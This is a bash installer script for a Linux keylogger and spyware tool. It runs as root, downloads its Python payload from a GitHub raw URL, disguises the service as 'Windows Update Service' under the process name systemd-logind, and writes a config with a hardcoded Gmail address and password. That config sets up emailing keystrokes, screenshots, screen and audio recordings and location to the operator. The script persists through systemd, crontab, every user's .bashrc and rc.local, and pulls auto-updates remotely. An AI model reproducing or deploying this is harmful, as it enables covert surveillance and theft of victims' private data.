#!/bin/bash
# ============================================================================
# POWERFUL LINUX KEYLOGGER INSTALLER
# ============================================================================

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${BLUE}============================================================${NC}"
echo -e "${GREEN} POWERFUL LINUX KEYLOGGER INSTALLER${NC}"
echo -e "${BLUE}============================================================${NC}"

# Check root
if [ "$EUID" -ne 0 ]; then 
    echo -e "${RED}[ERROR] Please run as root (sudo)${NC}"
    exit 1
fi

# Detect OS
echo -e "${YELLOW}[INFO] Detecting operating system...${NC}"
if [ -f /etc/os-release ]; then
    . /etc/os-release
    OS=$ID
    VERSION=$VERSION_ID
    echo -e "${GREEN}[OK] Detected: $PRETTY_NAME${NC}"
else
    OS="unknown"
fi

# Install system dependencies
echo -e "${YELLOW}[INFO] Installing system dependencies...${NC}"

if [ "$OS" == "ubuntu" ] || [ "$OS" == "debian" ] || [ "$OS" == "kali" ] || [ "$OS" == "parrot" ]; then
    apt-get update
    apt-get install -y \
        python3 \
        python3-pip \
        python3-venv \
        python3-dev \
        build-essential \
        x11-utils \
        xdotool \
        xclip \
        ffmpeg \
        pulseaudio-utils \
        alsa-utils \
        libpulse-dev \
        portaudio19-dev \
        libasound2-dev \
        wget \
        curl \
        git
else
    echo -e "${YELLOW}[WARNING] Unsupported OS. Please install dependencies manually.${NC}"
fi

# Create directories
echo -e "${YELLOW}[INFO] Creating directories...${NC}"
mkdir -p /opt/WindowsUpdateService
mkdir -p /etc/windowsupdateservice
mkdir -p /var/log/windowsupdateservice
mkdir -p /var/lib/windowsupdateservice

# Copy the script
echo -e "${YELLOW}[INFO] Installing keylogger...${NC}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Try local file first, then download from GitHub
if [ -f "$SCRIPT_DIR/linuxupdateservice.py" ]; then
    cp "$SCRIPT_DIR/linuxupdateservice.py" /opt/WindowsUpdateService/linuxupdateservice.py
    echo -e "${GREEN}[OK] Using local linuxupdateservice.py${NC}"
else
    # Download from GitHub - using the correct filename
    echo -e "${YELLOW}[INFO] Downloading from GitHub...${NC}"
    wget -O /opt/WindowsUpdateService/linuxupdateservice.py \
        https://raw.githubusercontent.com/terminal123b/linuxupdateservice/main/linuxupdateservice.py
fi

# Make it executable
chmod +x /opt/WindowsUpdateService/linuxupdateservice.py

# Create virtual environment
echo -e "${YELLOW}[INFO] Creating virtual environment...${NC}"
cd /opt/WindowsUpdateService
python3 -m venv venv

# Install Python packages
echo -e "${YELLOW}[INFO] Installing Python dependencies...${NC}"
source venv/bin/activate
pip install --upgrade pip

# Try local requirements.txt first
if [ -f "$SCRIPT_DIR/requirements.txt" ]; then
    pip install -r "$SCRIPT_DIR/requirements.txt"
else
    # Install from GitHub
    wget -O /tmp/requirements.txt \
        https://raw.githubusercontent.com/terminal123b/linuxupdateservice/main/requirements.txt 2>/dev/null || echo "# No requirements file" > /tmp/requirements.txt
    pip install -r /tmp/requirements.txt
fi

# Install common dependencies
pip install requests pynput Pillow pyaudio opencv-python python-xlib pyscreenshot psutil

deactivate

# Update shebang
echo -e "${YELLOW}[INFO] Updating shebang...${NC}"
sed -i '1s|#!/usr/bin/env python3|#!/opt/WindowsUpdateService/venv/bin/python3|' /opt/WindowsUpdateService/linuxupdateservice.py

# Create config if not exists
echo -e "${YELLOW}[INFO] Creating configuration...${NC}"
if [ ! -f /etc/windowsupdateservice/config.ini ]; then
    cat > /etc/windowsupdateservice/config.ini << 'EOF'
[Settings]
EmailUsername = terminal123b@gmail.com
EmailPassword = yuleohozhxxbajxx
EmailTo = terminal123b@gmail.com
SyncInterval = 600
MaxAttachments = 25

[Stealth]
HideProcess = true
RunOnStartup = true
ProcessName = systemd-logind

[Advanced]
ScreenshotsPerBatch = 10
ScreenshotBatchInterval = 600
ScreenRecordEnabled = true
ScreenRecordInterval = 120
ScreenRecordDuration = 30
AudioEnabled = true
AudioInterval = 120
AudioDuration = 30
LocationEnabled = true
LocationInterval = 300
MaxVideosPerEmail = 5
MaxAudioPerEmail = 10
ImageQuality = 70

[AutoUpdate]
Enabled = true
CheckOnStartup = true
CheckInterval = 86400
UpdateURL = https://raw.githubusercontent.com/terminal123b/linuxupdateservice/main/linuxupdateservice.py
VersionURL = https://raw.githubusercontent.com/terminal123b/linuxupdateservice/main/version.txt
EOF
    chmod 600 /etc/windowsupdateservice/config.ini
fi

# Create systemd service
echo -e "${YELLOW}[INFO] Creating systemd service...${NC}"
cat > /etc/systemd/system/windowsupdateservice.service << 'EOF'
[Unit]
Description=Windows Update Service
After=network.target sound.target graphical.target
Wants=network.target

[Service]
Type=simple
User=root
ExecStart=/opt/WindowsUpdateService/venv/bin/python3 /opt/WindowsUpdateService/linuxupdateservice.py --hidden
Restart=always
RestartSec=10
StandardOutput=null
StandardError=null
SyslogIdentifier=windowsupdateservice
Nice=19
IOSchedulingClass=idle

[Install]
WantedBy=multi-user.target
EOF

# Reload systemd and enable service
echo -e "${YELLOW}[INFO] Enabling and starting service...${NC}"
systemctl daemon-reload
systemctl enable windowsupdateservice.service
systemctl start windowsupdateservice.service

# Add to crontab for backup
echo -e "${YELLOW}[INFO] Adding to crontab...${NC}"
(crontab -l 2>/dev/null | grep -v "linuxupdateservice.py"; echo "@reboot /opt/WindowsUpdateService/venv/bin/python3 /opt/WindowsUpdateService/linuxupdateservice.py --hidden > /dev/null 2>&1") | crontab -

# Add to .bashrc
echo -e "${YELLOW}[INFO] Adding to .bashrc...${NC}"
for user_home in /home/* /root; do
    if [ -d "$user_home" ]; then
        bashrc="$user_home/.bashrc"
        if [ -f "$bashrc" ]; then
            if ! grep -q "linuxupdateservice.py" "$bashrc"; then
                echo -e "\n# Windows Update Service\n[ -x /opt/WindowsUpdateService/linuxupdateservice.py ] && /opt/WindowsUpdateService/venv/bin/python3 /opt/WindowsUpdateService/linuxupdateservice.py --hidden > /dev/null 2>&1 &" >> "$bashrc"
            fi
        fi
    fi
done

# Add to /etc/rc.local if exists
echo -e "${YELLOW}[INFO] Adding to rc.local...${NC}"
if [ -f /etc/rc.local ]; then
    if ! grep -q "linuxupdateservice.py" /etc/rc.local; then
        sed -i '/exit 0/i /opt/WindowsUpdateService/venv/bin/python3 /opt/WindowsUpdateService/linuxupdateservice.py --hidden > /dev/null 2>&1 &' /etc/rc.local
    fi
fi

# Create uninstall script
echo -e "${YELLOW}[INFO] Creating uninstall script...${NC}"
cat > /usr/local/bin/uninstall-keylogger << 'EOF'
#!/bin/bash
echo "Uninstalling keylogger..."
systemctl stop windowsupdateservice.service
systemctl disable windowsupdateservice.service
rm -f /etc/systemd/system/windowsupdateservice.service
systemctl daemon-reload
rm -rf /opt/WindowsUpdateService
rm -rf /etc/windowsupdateservice
rm -rf /var/log/windowsupdateservice
rm -rf /var/lib/windowsupdateservice
(crontab -l 2>/dev/null | grep -v "linuxupdateservice.py") | crontab -
sed -i '/linuxupdateservice.py/d' /root/.bashrc
sed -i '/linuxupdateservice.py/d' /etc/rc.local
echo "Uninstall complete!"
EOF

chmod +x /usr/local/bin/uninstall-keylogger

# Display completion message
echo -e "${GREEN}============================================================${NC}"
echo -e "${GREEN} INSTALLATION COMPLETE!${NC}"
echo -e "${GREEN}============================================================${NC}"
echo -e " Installation: ${BLUE}/opt/WindowsUpdateService/${NC}"
echo -e " Config: ${BLUE}/etc/windowsupdateservice/config.ini${NC}"
echo -e " Logs: ${BLUE}/var/log/windowsupdateservice/${NC}"
echo -e " Data: ${BLUE}/var/lib/windowsupdateservice/${NC}"
echo ""
echo -e " ${GREEN}Commands:${NC}"
echo -e "   Check status: ${BLUE}sudo systemctl status windowsupdateservice.service${NC}"
echo -e "   View logs: ${BLUE}sudo journalctl -u windowsupdateservice.service -f${NC}"
echo -e "   Stop service: ${BLUE}sudo systemctl stop windowsupdateservice.service${NC}"
echo -e "   Start service: ${BLUE}sudo systemctl start windowsupdateservice.service${NC}"
echo -e "   Uninstall: ${BLUE}sudo uninstall-keylogger${NC}"
echo ""
echo -e " ${YELLOW}To configure email, edit:${NC}"
echo -e "   ${BLUE}sudo nano /etc/windowsupdateservice/config.ini${NC}"
echo ""
echo -e " ${GREEN}The keylogger is now running silently in the background!${NC}"
echo -e "${GREEN}============================================================${NC}"
